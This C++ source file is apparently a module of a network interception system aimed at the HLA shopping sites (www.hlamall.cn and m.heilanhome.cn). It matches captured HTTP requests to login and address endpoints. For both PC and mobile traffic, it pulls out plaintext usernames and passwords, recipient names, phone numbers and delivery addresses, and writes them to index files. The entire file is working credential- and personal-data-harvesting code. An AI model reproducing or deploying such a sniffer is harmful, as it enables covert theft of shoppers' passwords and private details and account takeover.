#include "StdAfx.h"
#include "ShoppingHaiLanZhiJia.h"

shopping::HaiLanZhiJia::HaiLanZhiJia(HttpSession *http_session, const string &pro_name) : Shopping(http_session, pro_name)
{
	
}

shopping::HaiLanZhiJia::~HaiLanZhiJia()
{
	
}

int shopping::HaiLanZhiJia::IsHaiLanZhiJia(HttpSession *http_session)
{
	//pc登录信息
	if((http_session->m_Requestline.m_Host.Find("www.hlamall.cn")!=-1) &&  
		(http_session->m_Requestline.m_URI.Find("/logincenter/ajax/login")!=-1))
	{
		return kPCWebLogin;
	}
	//pc新增地址 修改地址	(购买商品时)
	if((http_session->m_Requestline.m_Host.Find("www.hlamall.cn")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/Order/Index/ajaxOrderAddress")!=-1))
	{
		return kPCWebAddAddress;
	}
	//pc新增地址 修改地址2	(个人中心-地址管理)
	if((http_session->m_Requestline.m_Host.Find("www.hlamall.cn")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/member/order/UpdateOrderAddr")!=-1))
	{
		return kPCWebModiyAdd;
	}
	//手机端登录信息
	if((http_session->m_Requestline.m_Host.Find("m.heilanhome.cn")!=-1) &&  
		(http_session->m_Requestline.m_URI.Find("/logincenter/appindex/actLogin")!=-1))
	{
		return kMobileLogin;
	}
	//手机端新增地址修改地址
	if((http_session->m_Requestline.m_Host.Find("m.heilanhome.cn")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/order/appindex/UpdateOrderAddress")!=-1))
	{
		return KMobileAddress;
	}
	if((http_session->m_Requestline.m_Host.Find("m.heilanhome.cn")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/member/apporder/hfUpdateOrderAddr")!=-1))
	{
		return kMobileModiy;
	}
	return 0;
}

int shopping::HaiLanZhiJia::Process(const char *packet,int action)
{
	//pc登录信息
	if (action == kPCWebLogin)
	{
		return PCWebLogin(packet);
	}	
	//pc新增地址 修改地址 1
	if (action == kPCWebAddAddress)
	{
		return PCWebAddAddress(packet);
	}
	//pc新增地址 修改地址 2
	if (action ==kPCWebModiyAdd)
	{
		return PCWebModiyAdd(packet);
	}
	//手机端登录信息
	if (action == kMobileLogin)
	{
		return MobileLogin(packet);
	}
	//pc端新增修改信息
	if (action == KMobileAddress)
	{
		return MobileAddress(packet);
	}
	if (action==kMobileModiy)
	{
		return MobileModiy(packet);
	}
	return 0;
}

//pc登录信息
int shopping::HaiLanZhiJia::PCWebLogin(const char *packet)
{
	string src_data(packet);
	string tookit = "name=";
	if (src_data.rfind(tookit) != -1)
	{
		src_data = src_data.substr(src_data.rfind(tookit));
	}
	ms_->SplitStringToMap(src_data,'&','=');

	string pass;
	user_=ms_->GetValueFromMapByKey("name",true);
	pass=ms_->GetValueFromMapByKey("password",true);

	if (user_.empty() || pass.empty())
	{
		return 0;
	}
	WriteVirtualIdentity(user_,"上线");
	output_text_ = 
		"user=" + user_ + "\r\n" + 
		"pass=" + pass + "\r\n" + 
		"state=登录\r\n";	
	WriteIndexFile();
	return 1;
}

//pc新增地址修改地址
int shopping::HaiLanZhiJia::PCWebAddAddress(const char *packet)
{	
	string src_data(packet);
	src_data = ms_->UrlDecode(src_data);

	ms_->SplitStringToMap(src_data,'&','=');
	//收货人
	name_=ms_->GetValueFromMapByKey("receiver",true);
	//地址
    address_ = ms_->GetValueFromMapByKey("province",true) + "," +
			   ms_->GetValueFromMapByKey("city",true) + "," +
			   ms_->GetValueFromMapByKey("district",true) + "," +
			   ms_->GetValueFromMapByKey("address",true);
	//手机号
	phone_=ms_->GetValueFromMapByKey("mobile",true);

	//判断ID
	string aid;
	aid=ms_->GetValueFromMapByKey("aid",true);
	int n=atoi(aid.c_str());
	if ( name_.empty() || phone_.empty() || address_.empty())
	{
		return 0;
	}
	if (n==0)
	{
		output_text_ = 
			"nick=" + name_ + "\r\n" + 
			"oid=" + phone_ + "\r\n" + 
			"msg=" + address_ + "\r\n" + 
			"state=新增地址\r\n";		
		WriteIndexFile();
	}
	else
	{

		output_text_ = 
			"nick=" + name_ + "\r\n" + 
			"oid=" + phone_ + "\r\n" + 
			"msg=" + address_ + "\r\n" + 
			"state=修改地址\r\n";	
		WriteIndexFile();
	}
	return 0;
}

int shopping::HaiLanZhiJia::PCWebModiyAdd(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UrlDecode(src_data);
	
	ms_->SplitStringToMap(src_data,'&','=');
	//收货人
	name_=ms_->GetValueFromMapByKey("r",true);
	//地址
	address_ = ms_->GetValueFromMapByKey("p",true) + "," +
			   ms_->GetValueFromMapByKey("c",true) + "," +
			   ms_->GetValueFromMapByKey("d",true) + "," +
			   ms_->GetValueFromMapByKey("addr",true);
	//手机号
	phone_=ms_->GetValueFromMapByKey("m",true);
	
	//判断ID
	string aid;
	aid=ms_->GetValueFromMapByKey("id",true);
	int n=atoi(aid.c_str());
	if ( name_.empty() || phone_.empty() || address_.empty())
	{
		return 0;
	}
	if (n==0)
	{
		output_text_ = 
			"nick=" + name_ + "\r\n" + 
			"oid=" + phone_ + "\r\n" + 
			"msg=" + address_ + "\r\n" + 
			"state=新增地址\r\n";
		
		WriteIndexFile();
		
	}else{
		output_text_ = 
			"nick=" + name_ + "\r\n" + 
			"oid=" + phone_ + "\r\n" + 
			"msg=" + address_ + "\r\n" + 
			"state=修改地址\r\n";
		
		WriteIndexFile();
		
	}
	return 0;
}

//手机登录
int shopping::HaiLanZhiJia::MobileLogin(const char *packet)
{
	string src_data(packet);
	src_data=ms_->UrlDecode(src_data);
	ms_->SplitStringToMap(src_data,'&','=');
	string pass;
	user_=ms_->GetValueFromMapByKey("name",true);
	pass=ms_->GetValueFromMapByKey("password",true);
	if (user_.empty() || pass.empty())
	{
		return 0;
	}

	output_text_ = 
		"user=" + user_ + "\r\n" + 
		"pass=" + pass + "\r\n" + 
		"state=登录\r\n";	
	WriteIndexFile();
	return 1;
}
//手机新增地址修改地址
int shopping::HaiLanZhiJia::MobileAddress(const char *packet)
{
	string src_data(packet);
	src_data=ms_->UrlDecode(src_data);
	ms_->SplitStringToMap(src_data,'&','=');
	//收件人
	name_=ms_->GetValueFromMapByKey("receiver",true);
	//手机号
	phone_=ms_->GetValueFromMapByKey("mobile",true);
	//地址
	address_= ms_->GetValueFromMapByKey("inp_province_ident",true) +
		      ms_->GetValueFromMapByKey("inp_city_ident",true) +
			  ms_->GetValueFromMapByKey("inp_district_ident",true) +
			  ms_->GetValueFromMapByKey("address",true);
	//判断ID 新增地址还是修改地址
	string id;
	id=ms_->GetValueFromMapByKey("id",true);
	int n=atoi(id.c_str());
	if (n==0)
	{
		output_text_ = 
			"nick=" + name_ + "\r\n" + 
			"oid=" + phone_ + "\r\n" + 
			"msg=" + address_ + "\r\n" + 
			"state=添加地址\r\n";
		
	WriteIndexFile();
	}
	else
	{
		output_text_ = 
			"nick=" + name_ + "\r\n" + 
			"oid=" + phone_ + "\r\n" + 
			"msg=" + address_ + "\r\n" + 
			"state=修改地址\r\n";
		
	WriteIndexFile();
	}
	return 0;
}

int shopping::HaiLanZhiJia::MobileModiy(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UrlDecode(src_data);
	src_data = src_data.substr(src_data.rfind("id="),src_data.length() - src_data.rfind("id="));
	
	ms_->SplitStringToMap(src_data,'&','=');
	//收货人
	name_=ms_->GetValueFromMapByKey("r",true);
	//地址
	address_=  ms_->GetValueFromMapByKey("p",true) + 
		       ms_->GetValueFromMapByKey("c",true) +
			   ms_->GetValueFromMapByKey("d",true) +
			   ms_->GetValueFromMapByKey("addr",true);

	//手机号
	phone_=ms_->GetValueFromMapByKey("m",true);
	
	//判断ID
	string aid;
	aid=ms_->GetValueFromMapByKey("id",true);
	int n=atoi(aid.c_str());
	if ( name_.empty() || phone_.empty() || address_.empty())
	{
		return 0;
	}
	if (n==0)
	{
		output_text_ = 
			"nick=" + name_ + "\r\n" + 
			"oid=" + phone_ + "\r\n" + 
			"msg=" + address_ + "\r\n" + 
			"state=添加地址\r\n";
		
		WriteIndexFile();
		
	}else{
		output_text_ = 
			"nick=" + name_ + "\r\n" + 
			"oid=" + phone_ + "\r\n" + 
			"msg=" + address_ + "\r\n" + 
			"state=修改地址\r\n";
		
		WriteIndexFile();
		
	}
	return 0;
}